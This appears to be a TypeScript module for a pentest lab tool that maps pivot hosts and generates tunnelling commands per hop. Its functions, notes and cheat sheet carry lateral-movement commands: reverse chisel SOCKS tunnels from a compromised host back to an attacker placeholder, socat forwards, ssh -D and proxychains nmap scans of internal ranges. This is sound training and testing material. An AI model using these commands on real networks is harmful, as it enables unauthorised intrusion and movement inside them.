/* Pivoting Map: modelo de nodos (con interfaces por red), descubrimiento
   de rutas multi-salto y generación de comandos chisel/socat/ssh por tramo. */

export interface PivotIface { cidr: string }

export interface PivotNode {
  id: string
  name: string
  role: 'atacante' | 'pivot' | 'objetivo'
  x: number
  y: number
  ifaces: PivotIface[]
  note?: string
}

export interface PivotEdge {
  from: string
  to: string
  proto: 'ssh' | 'chisel' | 'socat' | 'smb' | 'otro'
  alive: boolean
}

export function ifaceNet(cidr: string): string {
  const [ip, bits] = cidr.split('/')
  if (!ip || !bits) return cidr
  const p = ip.split('.').slice(0, Math.ceil(parseInt(bits) / 8)).join('.')
  return `${p}.0/${bits}`
}

/** ¿comparten alguna red dos nodos? → tramo directo posible */
export function sharedNet(a: PivotNode, b: PivotNode): string | null {
  const netsA = a.ifaces.map((i) => ifaceNet(i.cidr))
  const netsB = b.ifaces.map((i) => ifaceNet(i.cidr))
  for (const na of netsA) if (netsB.includes(na)) return na
  return null
}

/** BFS de rutas del atacante a cada nodo (por aristas vivas). */
export function computeRoutes(nodes: PivotNode[], edges: PivotEdge[]): Map<string, PivotNode[]> {
  const attacker = nodes.find((n) => n.role === 'atacante')
  const routes = new Map<string, PivotNode[]>()
  if (!attacker) return routes
  const adj = new Map<string, PivotNode[]>()
  for (const e of edges) {
    if (!e.alive) continue
    const a = nodes.find((n) => n.id === e.from), b = nodes.find((n) => n.id === e.to)
    if (!a || !b) continue
    if (!adj.has(e.from)) adj.set(e.from, [])
    if (!adj.has(e.to)) adj.set(e.to, [])
    adj.get(e.from)!.push(b)
    adj.get(e.to)!.push(a)
  }
  const visited = new Set<string>([attacker.id])
  const queue: PivotNode[][] = [[attacker]]
  routes.set(attacker.id, [attacker])
  while (queue.length) {
    const path = queue.shift()!
    const last = path[path.length - 1]
    for (const nb of adj.get(last.id) ?? []) {
      if (visited.has(nb.id)) continue
      visited.add(nb.id)
      const newPath = [...path, nb]
      routes.set(nb.id, newPath)
      queue.push(newPath)
    }
  }
  return routes
}

export interface PivotStep { cmd: string; why: string }

/** Comandos para el tramo attacker→node a través de la ruta. */
export function buildPivotCommands(nodes: PivotNode[], edges: PivotEdge[], route: PivotNode[], opts: { chiselPort: string }): { steps: PivotStep[]; socksvia: string } {
  const steps: PivotStep[] = []
  const find = (id: string) => nodes.find((n) => n.id === id)!
  // tramos: attacker→p1, p1→p2...
  for (let i = 0; i < route.length - 1; i++) {
    const a = route[i], b = route[i + 1]
    const edge = edges.find((e) => (e.from === a.id && e.to === b.id) || (e.from === b.id && e.to === a.id))
    const proto = edge?.proto ?? 'ssh'
    const prevHop = i === 0 ? null : route[i]
    const localPort = 1080 + i
    if (proto === 'chisel') {
      if (i === 0) {
        steps.push({ cmd: `# en tu máquina: servidor chisel`, why: 'el atacante hace de servidor: los pivotes conectan hacia ti' })
        steps.push({ cmd: `chisel server --port ${opts.chiselPort} --reverse`, why: '--reverse permite que el target abra túneles hacia ti' })
        steps.push({ cmd: `# en ${b.name}:`, why: 'cliente chisel conectado a tu IP pública/VPN' })
        steps.push({ cmd: `chisel client TU_IP:${opts.chiselPort} R:socks`, why: `abre un SOCKS5 en TU puerto 1080 que viaja hasta ${b.name}` })
      } else {
        steps.push({ cmd: `# encadenado en ${b.name} (encima del túnel anterior):`, why: 'usa el SOCKS del tramo previo para alcanzar este pivote' })
        steps.push({ cmd: `proxychains -q chisel client TU_IP:${opts.chiselPort} R:socks`, why: `SOCKS5 adicional en tu puerto ${localPort}` })
      }
    } else if (proto === 'socat') {
      const nextNet = b.ifaces[0]?.cidr ?? 'REDE'
      steps.push({ cmd: `# en ${a.name} (el pivote actual):`, why: 'socat hace de "parche" de TCP entre tu listener y el siguiente salto' })
      steps.push({ cmd: `socat TCP-LISTEN:${localPort},fork,reuseaddr TCP:${nextNet.split('/')[0] === '' ? 'IP_SIGUIENTE' : 'IP_EN_' + b.name}:${80 + i}`, why: 'redirige un puerto local hacia el destino a través del pivote' })
      steps.push({ cmd: `# en tu máquina:`, why: 'conecta al puerto redirigido como si fuera el destino' })
      steps.push({ cmd: `curl --proxy '' http://IP_DE_${a.name.toUpperCase()}:${localPort}/`, why: 'verificación del tramo' })
    } else {
      // ssh dinámico: el clásico
      const user = 'user'
      steps.push({ cmd: `# SOCKS dinámico vía SSH en ${b.name}:`, why: 'ssh -D abre un SOCKS5 en tu máquina que viaja cifrado hasta el pivote' })
      steps.push({ cmd: `ssh -D ${localPort} -N -f ${user}@${b.name.startsWith('t') ? b.name : 'IP_DE_' + b.name.toUpperCase()}`, why: '-N sin comando remoto, -f background, -D puerto SOCKS' })
      if (i > 0) steps.push({ cmd: `# si el SSH solo es alcanzable DESDE el pivote anterior:`, why: 'salta a través del túnel previo con proxychains o -o ProxyJump' })
      if (i > 0) steps.push({ cmd: `ssh -J ${prevHop?.name ?? 'pivote'} ${user}@IP_DE_${b.name.toUpperCase()}`, why: 'ProxyJump (ssh -J) encadena saltos sin túneles manuales' })
    }
  }
  const socksPort = 1080
  return {
    steps,
    socksvia: `proxychains -q nmap -sT -Pn --top-ports 100 <red_interna>   # todo pasa por el SOCKS :${socksPort}`,
  }
}

export const PIVOT_PRESET: { name: string; nodes: Omit<PivotNode, 'x' | 'y'>[]; edges: PivotEdge[] } = {
  name: 'lab clásico DMZ → LAN',
  nodes: [
    { id: 'kali', name: 'kali', role: 'atacante', ifaces: [{ cidr: '10.10.14.5/24' }] },
    { id: 'dmz', name: 'web-dmz', role: 'pivot', ifaces: [{ cidr: '10.10.14.20/24' }, { cidr: '10.10.10.5/24' }], note: 'apache + shell inicial' },
    { id: 'lan', name: 'fileserver', role: 'objetivo', ifaces: [{ cidr: '10.10.10.15/24' }], note: 'solo accesible desde la DMZ' },
  ],
  edges: [
    { from: 'kali', to: 'dmz', proto: 'ssh', alive: true },
    { from: 'dmz', to: 'lan', proto: 'chisel', alive: true },
  ],
}

export const PIVOT_NOTES: string[] = [
  'Enumera SIEMPRE las interfaces del pivote: ip a (Linux) / ipconfig /all (Windows) revela la siguiente red.',
  'Chisel gana a socat en claridad: un único SOCKS5 que se encadena; socat gana en portabilidad (está en todas partes).',
  'ssh -J (ProxyJump) es lo primero que debes probar: si hay SSH, encadena saltos sin herramientas extra.',
  'Proxychains: edita /etc/proxychains4.conf con socks5 127.0.0.1 1080 y añade quiet al principio.',
  'Con Windows targets: plink.exe -D 1080 user@pivote equivale a ssh -D desde un binario portable.',
  'Todo pivoting debe quedar documentado en el informe: diagrama + comandos + justificación de cada salto.',
]

export const PIVOT_CHEATSHEET: [string, string][] = [
  ['enumerar interfaces', 'ip a · ipconfig /all · hostname -I'],
  ['descubrir red vecina', 'nmap -sn 10.10.10.0/24 (desde el pivote) · for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i &) ; done; arp -a'],
  ['SOCKS con SSH', 'ssh -D 1080 -N -f user@pivote'],
  ['SOCKS con chisel', 'servidor: chisel server -p 8000 --reverse · cliente: chisel client IP:8000 R:socks'],
  ['port forward simple', 'socat TCP-LISTEN:3389,fork TCP:10.10.10.15:3389'],
  ['proxychains', 'proxychains -q nmap -sT -Pn 10.10.10.0/24'],
  ['sshuttle (mágico)', 'sshuttle -r user@pivote 10.10.10.0/24 — VPN sin instalar nada en el pivote'],
]
